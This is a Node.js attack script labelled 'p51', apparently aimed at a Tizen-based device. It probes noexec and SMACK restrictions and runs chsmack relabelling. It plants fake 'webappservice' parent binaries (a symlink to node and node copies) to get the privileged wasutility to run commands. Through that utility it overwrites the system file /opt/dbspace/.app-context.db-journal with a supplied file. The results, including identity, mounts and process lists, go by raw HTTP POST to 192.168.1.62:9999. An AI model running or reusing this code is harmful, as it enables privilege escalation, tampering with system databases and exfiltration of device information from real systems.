"use strict";

/* p51: wasutility authority root-cause + fake-parent exec fix
   1. noexec/SMACK diagnosis:
      - /proc/mounts for /tmp and /
      - copy /bin/true to /tmp and /home/owner, run each
   2. chsmack availability + can owner relabel?
   3. find real webappservice daemon: /proc comm names + locate binary + init config
   4. fake parent B: SYMLINK /tmp/.../webappservice -> /usr/bin/node
      (parent exe resolves to /usr/bin/node, root-owned, label _)
      -> run wasutility -h + REPL, capture inner execPath/self_exe + output
   5. fake parent A: node COPY at /tmp/.../webappservice (+ try chsmack label _)
      -> run wasutility -h + REPL, capture
   6. verify markers + journal after
   exfil /p51info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var SRC = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var R = { ts: new Date().toISOString(), probe: 'p51', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p51info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 6000);
  }
}

function runDirect(file, args, input, timeoutMs) {
  try {
    var opt = { timeout: timeoutMs || 10000, maxBuffer: 8 * 1024 * 1024 };
    if (input !== undefined) opt.input = input;
    var r = cp.spawnSync(file, args, opt);
    var out = '';
    if (r.stdout) out += 'OUT: ' + r.stdout.toString();
    if (r.stderr) out += ' ERR: ' + r.stderr.toString();
    out += ' [exit ' + (r.status === null ? 'null' : r.status) + ']';
    if (r.error) out += ' [spawnErr ' + r.error.message + ']';
    return out.substring(0, 8000);
  } catch (e) { return 'ERR ' + e.message; }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) noexec / SMACK diagnosis
  R.results.mounts = run('cat /proc/mounts 2>&1 | grep -E " /tmp | /home | /opt | / " ; echo ===FSTAB===; cat /etc/fstab 2>&1 | head', 15000);
  R.results.exec_tmp = run('rm -f /tmp/p51_true; cp /bin/true /tmp/p51_true 2>&1; echo cp=$?; /tmp/p51_true; echo true_tmp_exit=$?; ls -Z /tmp/p51_true 2>&1', 15000);
  R.results.exec_home = run('rm -f /home/owner/p51_true; cp /bin/true /home/owner/p51_true 2>&1; echo cp=$?; /home/owner/p51_true; echo true_home_exit=$?; ls -Z /home/owner/p51_true 2>&1', 15000);

  // 2) chsmack
  R.results.chsmack = run('which chsmack 2>&1; chsmack --help 2>&1 | head -15; echo ===TRY_RELABEL===; cp /bin/true /tmp/p51_true2 2>&1; chsmack -l _ /tmp/p51_true2 2>&1; echo chsmack_exit=$?; ls -Z /tmp/p51_true2 2>&1', 15000);

  // 3) find webappservice daemon
  R.results.proc_comm = run('for c in /proc/[0-9]*/comm; do cat "$c" 2>/dev/null; done | sort | uniq -c | sort -rn | head -40', 20000);
  R.results.find_was_bin = run('find /opt /usr -name "*webappservice*" 2>/dev/null | head -20; echo ===INIT===; ls -la /etc/init.d/ 2>/dev/null | grep -iE "was|webapp|app" ; grep -rl "webappservice" /etc/init.d/ /etc/systemd/ 2>/dev/null | head', 30000);

  // 4) fake parent B: SYMLINK -> /usr/bin/node
  R.results.setup_B = run('rm -rf /tmp/p51psB; mkdir -p /tmp/p51psB/org.tizen.webappservice/bin 2>&1; ln -sf /usr/bin/node /tmp/p51psB/org.tizen.webappservice/bin/webappservice 2>&1; echo ln=$?; ls -la /tmp/p51psB/org.tizen.webappservice/bin/ 2>&1; ls -laZ /tmp/p51psB/org.tizen.webappservice/bin/webappservice 2>&1', 15000);

  // inner script: report execPath/self_exe + run wasutility -h + REPL
  var repl = ['help', '?', 'id', 'whoami', 'e /tmp/p51_e_dir', 'touch /tmp/p51_repl_marker', 'cp ' + SRC + ' ' + DST, 'md5sum ' + DST, 'ls -la ' + DST, 'quit', 'exit'].join('\n') + '\n';
  var inner = "var cp=require('child_process');var fs=require('fs');var out={};out.execPath=process.execPath;out.pid=process.pid;out.ppid=process.ppid;try{out.self_exe=fs.readlinkSync('/proc/self/exe')}catch(e){out.self_exe='err'+e.message};var h=cp.spawnSync('/usr/bin/wasutility',['-h'],{timeout:8000});out.dashh={o:h.stdout?h.stdout.toString().substring(0,1500):'',e:h.stderr?h.stderr.toString().substring(0,500):'',x:h.status,sp:h.error?h.error.message:''};var r=cp.spawnSync('/usr/bin/wasutility',[],{input:" + JSON.stringify(repl) + ",timeout:16000});out.repl={o:r.stdout?r.stdout.toString().substring(0,3000):'',e:r.stderr?r.stderr.toString().substring(0,1000):'',x:r.status,sp:r.error?r.error.message:''};console.log(JSON.stringify(out));\n";
  try { fs.writeFileSync('/tmp/p51_inner.js', inner); } catch (e) { R.results.inner_write_err = String(e); }

  R.results.fakeB_dashh_repl = runDirect('/tmp/p51psB/org.tizen.webappservice/bin/webappservice', ['-e', "require('/tmp/p51_inner.js')"], undefined, 40000);

  // 5) fake parent A: node COPY (+ try chsmack relabel to _)
  R.results.setup_A = run('rm -rf /tmp/p51psA; mkdir -p /tmp/p51psA/org.tizen.webappservice/bin 2>&1; cp -f /usr/bin/node /tmp/p51psA/org.tizen.webappservice/bin/webappservice 2>&1; echo cp=$?; ls -laZ /tmp/p51psA/org.tizen.webappservice/bin/webappservice 2>&1; chsmack -l _ /tmp/p51psA/org.tizen.webappservice/bin/webappservice 2>&1; echo chsmack=$?; ls -laZ /tmp/p51psA/org.tizen.webappservice/bin/webappservice 2>&1', 25000);
  R.results.fakeA_dashh_repl = runDirect('/tmp/p51psA/org.tizen.webappservice/bin/webappservice', ['-e', "require('/tmp/p51_inner.js')"], undefined, 40000);

  // also try fake A in /home/owner (in case /tmp is noexec)
  R.results.setup_Ah = run('rm -rf /home/owner/p51psA; mkdir -p /home/owner/p51psA/org.tizen.webappservice/bin 2>&1; cp -f /usr/bin/node /home/owner/p51psA/org.tizen.webappservice/bin/webappservice 2>&1; echo cp=$?; ls -laZ /home/owner/p51psA/org.tizen.webappservice/bin/webappservice 2>&1', 25000);
  R.results.fakeAh_dashh_repl = runDirect('/home/owner/p51psA/org.tizen.webappservice/bin/webappservice', ['-e', "require('/tmp/p51_inner.js')"], undefined, 40000);

  // 6) verify
  R.results.verify = run('echo ===MARKERS===; ls -la /tmp/p51_repl_marker 2>&1; ls -la /tmp/p51_e_dir 2>&1; echo ===JRN===; md5sum ' + DST + ' 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
